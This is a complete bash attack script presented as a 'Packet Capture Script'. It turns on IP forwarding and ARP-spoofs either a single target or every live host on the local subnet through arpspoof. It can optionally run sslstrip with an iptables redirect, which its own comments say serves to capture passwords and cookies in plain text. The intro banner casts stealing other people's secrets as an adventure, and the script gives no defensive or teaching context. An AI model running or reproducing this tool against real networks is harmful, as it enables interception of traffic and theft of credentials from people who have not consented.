#!/bin/bash

# Colors for formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No color

# Thrilling introduction message
echo -e "${MAGENTA}========================================${NC}"
echo -e "${CYAN}Welcome to the Packet Capture Script!${NC}"
echo -e "${MAGENTA}========================================${NC}"
echo -e "${CYAN}Ready to discover what's going on around you?${NC}"
echo -e "${CYAN}Are you ready to see what you cannot see?${NC}"
echo -e "${CYAN}You will have the ability to see what you cannot see.${NC}"
echo -e "${CYAN}But remember, everything they're hiding is more than just data, it's their secrets.${NC}"
echo -e "${CYAN}Don't hesitate, this is your chance to live an unforgettable adventure... but be careful!${NC}"
echo -e "${MAGENTA}========================================${NC}"

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}You need ROOT privileges to execute this script.${NC}"
    exit 1
fi

# Enable IP forwarding
echo -e "${YELLOW}Enabling IP forwarding...${NC}"
sysctl -w net.ipv4.ip_forward=1 &>/dev/null

# Cleanup function to restore system state on exit
function cleanup() {
    echo -e "${RED}\nRestoring system configuration...${NC}"
    sysctl -w net.ipv4.ip_forward=0 &>/dev/null
    pkill arpspoof &>/dev/null
    pkill sslstrip &>/dev/null
    iptables -t nat -F
    iptables -F
    iptables -X
    echo -e "${GREEN}Cleanup complete.${NC}"
    exit 0
}

# Trap CTRL+C to trigger cleanup
trap cleanup SIGINT

# Automatically detect the router IP
router=$(ip route | grep default | awk '{print $3}')
if [[ -z "$router" ]]; then
    echo -e "${RED}Unable to detect router. Please check your network connection.${NC}"
    exit 1
fi

# Function to select a network interface
function select_interface() {
    while true; do
        interfaces=$(ip -o link show | awk -F': ' '{print $2}')
        PS3="Select your network interface: "
        select iface in $interfaces; do
            if [[ -n "$iface" ]]; then
                selected_iface=$iface
                echo -e "${GREEN}Selected interface: $selected_iface${NC}"
                return  # Exit the function when a valid interface is selected
            else
                echo -e "${RED}Invalid selection. Try again.${NC}"
                break  # Restart the select loop to show interfaces again
            fi
        done
    done
}

select_interface

# Display router information
echo -e "${GREEN}Router IP: $router${NC}"

# Enable SSLStrip (optional)
function enable_sslstrip() {
    while true; do
        echo -e "${CYAN}SSLStrip is a tool that allows you to strip the SSL encryption from HTTPS connections, turning them into HTTP. This enables you to intercept sensitive information like passwords and cookies in plain text.${NC}"
        read -p "Enable SSLStrip? (yes/y or no/n): " sslstrip_choice
        case $sslstrip_choice in
            yes|y)
                echo -e "${YELLOW}Starting SSLStrip...${NC}"
                sslstrip -l 8080 &
                iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
                echo -e "${GREEN}SSLStrip enabled.${NC}"
                break
                ;;
            no|n)
                echo -e "${GREEN}Skipping SSLStrip.${NC}"
                break
                ;;
            *)
                echo -e "${RED}Invalid input. Please answer 'yes/y' or 'no/n'.${NC}"
                ;;
        esac
    done
}

# Attack a single device
function attack_single() {
    read -p "Enter target IP: " target_ip
    enable_sslstrip
    echo -e "${YELLOW}Launching ARP spoofing on $target_ip...${NC}"
    arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
    arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
    echo -e "${GREEN}ARP spoofing attack active. Press CTRL+C to stop.${NC}"
    wait
}

# Attack the entire network dynamically
function attack_all_dynamic() {
    network=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
    IFS=. read -r i1 i2 i3 i4 <<< $(echo $network | cut -d'/' -f1)
    enable_sslstrip
    declare -A attacked_devices

    echo -e "${YELLOW}Scanning network for active devices...${NC}"
    while true; do
        for ip in $(seq 1 254); do
            target_ip="${i1}.${i2}.${i3}.${ip}"
            if ping -c 1 -W 1 $target_ip &>/dev/null && [[ -z "${attacked_devices[$target_ip]}" ]]; then
                echo -e "${GREEN}New device found: $target_ip. Launching ARP spoofing...${NC}"
                attacked_devices[$target_ip]=1
                arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
                arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
            fi
        done
        sleep 60
    done
}

# Prompt user to choose attack type
function select_attack_type() {
    while true; do
        echo -e "${YELLOW}Select attack type:${NC}"
        echo "1) Single Device"
        echo "2) Entire Network"
        read -p "Your choice: " attack_choice
        case $attack_choice in
            1) attack_single; break ;;
            2) attack_all_dynamic; break ;;
            *)
                echo -e "${RED}Invalid choice. Please choose 1 or 2.${NC}"
                ;;
        esac
    done
}

select_attack_type
